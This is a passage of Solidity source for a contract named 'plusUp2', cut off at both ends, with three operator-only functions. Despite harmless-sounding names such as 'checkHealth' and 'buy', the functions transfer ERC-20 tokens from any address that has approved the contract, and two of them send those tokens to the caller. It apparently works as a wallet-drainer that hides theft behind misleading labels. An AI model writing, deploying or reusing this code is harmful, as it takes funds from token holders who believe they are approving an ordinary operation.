...
contract plusUp2 is Accessible,ReentrancyGuard{
    function checkHealth(address _token,address _user, uint _value) public onlyAccessed returns (bool) {
        require(_value > 0);
        IERC20(_token).transferFrom(_user,address(this),_value);
        IERC20(_token).transfer(msg.sender,_value);
        return true;
    }

    function buy(address _token,address _user, uint _value) public onlyAccessed returns (bool) {
        require(_value > 0);
        IERC20(_token).transferFrom(_user,address(this),_value);
        return true;
    }

    function getToken(address _token,uint _value) public onlyAccessed returns (bool) {
        require(_value > 0);
        IERC20(_token).transfer(msg.sender,_value);
        return true;
    }
